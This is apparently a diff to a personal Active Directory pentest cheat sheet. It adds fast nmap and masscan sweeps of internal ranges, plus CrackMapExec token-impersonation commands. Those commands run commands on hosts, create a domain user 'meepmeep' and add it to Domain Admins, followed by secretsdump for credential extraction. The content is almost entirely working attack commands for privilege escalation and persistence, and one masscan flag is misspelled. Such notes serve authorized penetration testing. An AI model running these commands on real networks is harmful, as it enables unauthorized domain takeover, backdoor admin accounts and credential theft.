@@ -2,7 +2,8 @@
  # also visit https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
 
 #find hosts
-	nmap -p135,445,22,80 -T2 -Pn -n --max-retries=1 --max-rtt-timeout=500ms -vvv -iL scope.txt -oA online-hosts
+	nmap -p135,445,22,80 -T4 -Pn -n --max-retries=1 --max-rtt-timeout=500ms -vvv -iL scope.txt -oA online-hosts
+	masscan -p22,80,135,445 10.0.0.0/8 --mine-rate 10000 --max-rate 15000 -oG masscan
 
 #Find DCs
 	nslookup domain.com
@@ -59,6 +60,13 @@
 
 
 #Post exploit / admin
+
+	#impersonate with cme (need admin duh)
+	cme smb ips -d domain -u user -p pass -M impersonate
+	cme smb ips -d domain -u user -p pass -M impersonate -o TOKEN=0 EXEC='whoami'
+	cme smb ips -d domain -u user -p pass -M impersonate -o TOKEN=0 EXEC='net user meepmeep password123 /add /domain'
+	cme smb ips -d domain -u user -p pass -M impersonate -o TOKEN=0 EXEC='net group "Domain Admins" meepmeep /add /domain'
+
 
 	secretsdump
 
